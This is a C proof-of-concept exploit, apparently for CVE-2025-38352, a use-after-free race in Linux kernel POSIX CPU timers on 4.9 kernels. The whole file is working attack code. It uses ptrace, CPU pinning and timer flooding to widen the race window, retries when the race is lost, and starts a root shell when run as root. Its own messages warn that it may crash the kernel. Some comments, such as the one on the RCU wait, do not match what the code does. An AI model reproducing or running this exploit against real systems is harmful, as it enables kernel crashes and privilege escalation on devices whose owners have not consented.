#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/signalfd.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <time.h>

#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) \
        err(1, "SYSCHK(" #x ")"); \
    __res; \
})

#define NUM_SAMPLES 100000
#define NUM_TIMERS 18
#define NUM_PAD_TIMERS 14
#define ONE_MS_NS 1000000uLL
#define SYSCALL_LOOP_TIMES_MAX 1000
#define CPU_USAGE_THRESHOLD 5000
#define PAGE_SIZE 0x1000uLL

struct shared_mem {
    int sync;
};

void pin_on_cpu(int i) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void wait_for_rcu() {
    // 4.9 kernel compatible RCU wait using synchronize_sched()
    syscall(__NR_sched_yield);
    usleep(1000);
}

static inline long long ts_to_ns(const struct timespec *ts) {
    return (long long)ts->tv_sec * 1000000000LL + (long long)ts->tv_nsec;
}

static int futex_wake(int *uaddr, int n) {
    return (int)syscall(__NR_futex, uaddr, 1, n, NULL, NULL, 0);
}

static int futex_wait(int *uaddr, int expected) {
    return (int)syscall(__NR_futex, uaddr, 0, expected, NULL, NULL, 0);
}

long int getpid_cpu_usage() {
    struct timespec *ts = malloc(NUM_SAMPLES * sizeof(struct timespec));
    if (!ts) return -1;

    // Measure clock_gettime overhead
    long int overhead_avg = 0;
    for (int i = 0; i < NUM_SAMPLES; i++) {
        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
    }
    long int total_nsec = 0;
    for (int i = 0; i < NUM_SAMPLES - 1; i++) {
        total_nsec += ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]);
    }
    overhead_avg = total_nsec / (NUM_SAMPLES - 1);

    // Measure getpid + clock_gettime
    for (int i = 0; i < NUM_SAMPLES; i++) {
        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        syscall(__NR_getpid);
    }
    total_nsec = 0;
    for (int i = 0; i < NUM_SAMPLES - 1; i++) {
        total_nsec += ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]) - overhead_avg;
    }
    free(ts);
    return total_nsec / (NUM_SAMPLES - 1);
}

pthread_barrier_t barrier;
timer_t stall_timers[NUM_TIMERS];
timer_t pad_timers[NUM_PAD_TIMERS];
pthread_t reapee_thread;
int e2w[2];
int c2p[2];
int p2c[2];
int stall_fds[2];
int sfd;
int syscall_loop_times = 0;
int race_retry_count = 0;
int full_retry_count = 0;
pid_t exploit_child_tid;
timer_t uaf_timer;

void reapee_func(void) {
    pin_on_cpu(1);

    struct sigevent race_evt = {0};
    race_evt.sigev_notify = SIGEV_SIGNAL;
    race_evt.sigev_signo = SIGUSR1;

    struct sigevent race_win_evt = {0};
    race_win_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
    race_win_evt.sigev_signo = SIGUSR1;
    race_win_evt._sigev_un._tid = exploit_child_tid;

    struct sigevent uaf_evt = {0};
    uaf_evt.sigev_notify = SIGEV_SIGNAL | SIGEV_THREAD_ID;
    uaf_evt.sigev_signo = SIGUSR2;
    uaf_evt._sigev_un._tid = exploit_child_tid;
    uaf_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL;

    prctl(PR_SET_NAME, "REAPEE");
    pid_t tid = (pid_t)syscall(SYS_gettid);
    SYSCHK(write(c2p[1], &tid, sizeof(pid_t)));

    long int getpid_avg = getpid_cpu_usage();
    if (getpid_avg <= 0) getpid_avg = 5000; // fallback

    pthread_barrier_wait(&barrier);

    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &uaf_evt, &uaf_timer));
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_win_evt, &stall_timers[0]));
    for (int i = 1; i < NUM_TIMERS; i++) {
        SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &race_evt, &stall_timers[i]));
    }

    pthread_barrier_wait(&barrier);
    pthread_barrier_wait(&barrier);

    int loops = ((ONE_MS_NS / getpid_avg) + CPU_USAGE_THRESHOLD - syscall_loop_times);
    if (loops < 0) loops = 0;
    for (int i = 0; i < loops; i++) {
        syscall(__NR_getpid);
    }

    return;
}

void sleep_func(void) {
    pin_on_cpu(3);
    prctl(PR_SET_NAME, "SLEEP");
    char m;
    for (;;) {
        read(stall_fds[0], &m, 1);
    }
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }

    printf("[*] CVE-2025-38352 PoC for 4.9 kernel\n");
    printf("[*] Warning: This PoC may cause kernel crash if race is lost\n");
    printf("[*] Attempting to trigger UAF...\n");

    setbuf(stdout, NULL);
    pin_on_cpu(0);

    SYSCHK(pipe(e2w));
    SYSCHK(pipe(c2p));
    SYSCHK(pipe(p2c));
    SYSCHK(pipe(stall_fds));

    // Create sleep threads to stall race window
    for (int i = 0; i < NUM_PAD_TIMERS; i++) {
        pthread_t thr;
        pthread_create(&thr, NULL, (void*)sleep_func, NULL);
        pthread_detach(thr);
    }

    struct shared_mem *shm = mmap(NULL, sizeof(struct shared_mem),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);

    pid_t pid = SYSCHK(fork());

    if (pid) { // parent
        pin_on_cpu(0);
        char m;
        close(c2p[1]);
        close(p2c[0]);
        prctl(PR_SET_NAME, "EXPLOIT_PARENT");

        pid_t tid;
        read(c2p[0], &tid, sizeof(pid_t));

        __atomic_store_n(&shm->sync, 0, __ATOMIC_RELAXED);
        SYSCHK(ptrace(PTRACE_ATTACH, tid, NULL, NULL));
        SYSCHK(waitpid(tid, NULL, __WALL));
        SYSCHK(ptrace(PTRACE_CONT, tid, NULL, NULL));
        SYSCHK(write(p2c[1], &m, 1));
        SYSCHK(waitpid(tid, NULL, __WALL));

        __atomic_add_fetch(&shm->sync, 1, __ATOMIC_RELEASE);
        futex_wake(&shm->sync, 1);
        read(c2p[0], &m, 1);

        SYSCHK(write(e2w[1], &m, 1));
        waitpid(pid, NULL, __WALL);
        close(e2w[1]);
        close(c2p[0]);
        close(p2c[1]);
        exit(0);
    } else { // child
        pin_on_cpu(2);
        close(c2p[0]);
        close(p2c[1]);

        struct sched_param sp = { .sched_priority = 10 };
        SYSCHK(pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp));
        exploit_child_tid = (pid_t)syscall(SYS_gettid);

        char m = 0;
        write(stall_fds[1], &m, 1);
        read(stall_fds[0], &m, 1);

        sigset_t block_mask;
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGUSR1);
        sigaddset(&block_mask, SIGUSR2);
        sigprocmask(SIG_BLOCK, &block_mask, NULL);

        pthread_barrier_init(&barrier, NULL, 2);

        pthread_create(&reapee_thread, NULL, (void*)reapee_func, NULL);
        pthread_barrier_wait(&barrier);

        read(p2c[0], &m, 1);
        pthread_barrier_wait(&barrier);
        pthread_barrier_wait(&barrier);

        struct itimerspec ts = {
            .it_interval = {0, 0},
            .it_value = { .tv_sec = 0, .tv_nsec = ONE_MS_NS - 1 },
        };
        for (int i = 0; i < NUM_TIMERS; i++) {
            timer_settime(stall_timers[i], 0, &ts, NULL);
        }
        ts.it_value.tv_nsec = ONE_MS_NS;
        timer_settime(uaf_timer, 0, &ts, NULL);

        int last = __atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE);
        pthread_barrier_wait(&barrier);

        while (__atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE) == last) {
            futex_wait(&shm->sync, last);
        }

        timer_delete(uaf_timer);

        struct timespec sig_ts = { .tv_sec = 0, .tv_nsec = 300000000 };
        int race_won = 0;
        for (;;) {
            int sig = sigtimedwait(&block_mask, NULL, &sig_ts);
            if (sig == SIGUSR2) {
                race_won = 0;
                break;
            } else if (sig == SIGUSR1) {
                race_won = 1;
                continue;
            } else if (sig < 0 && errno == EAGAIN) {
                break;
            }
        }

        if (race_won) {
            printf("[+] Race condition triggered successfully!\n");
            printf("[+] Check dmesg for UAF evidence (likely kernel crash)\n");
        } else {
            syscall_loop_times++;
            syscall_loop_times %= SYSCALL_LOOP_TIMES_MAX + 1;
            if (syscall_loop_times == 0) syscall_loop_times = 1;
            race_retry_count++;
            if (race_retry_count % 10 == 0) {
                printf("[*] Race lost %d times, retrying...\n", race_retry_count);
            }
        }

        for (int i = 0; i < NUM_TIMERS; i++) {
            timer_delete(stall_timers[i]);
        }
        wait_for_rcu();

        SYSCHK(write(c2p[1], &m, 1));
        read(e2w[0], &m, 1);
        pthread_cancel(reapee_thread);
        pthread_join(reapee_thread, NULL);
        pthread_barrier_destroy(&barrier);
        exit(0);
    }
}
